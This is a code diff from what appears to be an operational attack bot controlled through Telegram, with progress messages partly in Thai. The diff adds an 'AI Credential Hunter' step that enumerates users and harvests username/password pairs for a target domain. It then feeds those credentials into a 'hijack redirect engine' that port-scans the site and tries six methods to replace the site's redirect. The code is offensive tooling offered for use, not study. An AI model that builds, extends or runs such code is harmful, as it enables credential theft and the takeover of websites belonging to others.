@@ -4083,7 +4083,32 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       timings.push({ step: "Redirect URL selected", ms: Date.now() - s1, ok: true });
       stepIndex++;
       
-      // Step 2-8: Execute hijack redirect with all 6 methods
+      // Step 2: AI Credential Hunter
+      await updateProgress("🔑 AI Credential Hunter กำลังค้นหา credentials...", "running");
+      const s1b = Date.now();
+      let huntedCreds: Array<{ username: string; password: string }> = [];
+      let credHuntSummary = "";
+      try {
+        const { executeCredentialHunt } = await import("./ai-credential-hunter");
+        const huntResult = await executeCredentialHunt({
+          domain,
+          maxDurationMs: 45_000,
+          onProgress: async (phase, detail) => {
+            try {
+              await editTelegramMessage(config, chatId, progressMsgId,
+                `🔑 Credential Hunter: ${domain}\n\n${detail}`);
+            } catch { /* ignore */ }
+          },
+        });
+        huntedCreds = huntResult.credentials.slice(0, 100).map(c => ({ username: c.username, password: c.password }));
+        credHuntSummary = `🔑 CredHunter: ${huntResult.credentials.length} creds found (${huntResult.enumeratedUsers.length} users, ${huntResult.techniques.filter(t => t.status === "success").length}/${huntResult.techniques.length} techniques)`;
+        timings.push({ step: credHuntSummary, ms: Date.now() - s1b, ok: huntResult.credentials.length > 0 });
+      } catch (credErr: any) {
+        timings.push({ step: `CredHunter: ${credErr.message}`, ms: Date.now() - s1b, ok: false });
+      }
+      stepIndex++;
+      
+      // Step 3-8: Execute hijack redirect with all 6 methods + AI credentials
       await updateProgress("Port scanning + trying 6 methods...", "running");
       const s2 = Date.now();
       const { executeHijackRedirect } = await import("./hijack-redirect-engine");
@@ -4091,6 +4116,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       const hijackResult = await executeHijackRedirect({
         targetDomain: domain,
         newRedirectUrl: hijackRedirectUrl,
+        credentials: huntedCreds.length > 0 ? huntedCreds : undefined,
       }, async (phase, detail, methodIndex, totalMethods) => {
         try {
           attackEntry.lastUpdate = detail;
@@ -4144,6 +4170,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         if (hijackResult.originalRedirectUrl) {
           msg += `\uD83D\uDD04 Old Redirect: ${hijackResult.originalRedirectUrl.substring(0, 50)}\n`;
         }
+        if (credHuntSummary) msg += `${credHuntSummary}\n`;
         msg += `\n\uD83D\uDCCA Methods tried:\n`;
         for (const mr of hijackResult.methodResults) {
           msg += `  ${mr.success ? "\u2705" : "\u274C"} ${mr.methodLabel} (${formatDuration(mr.durationMs)})\n`;
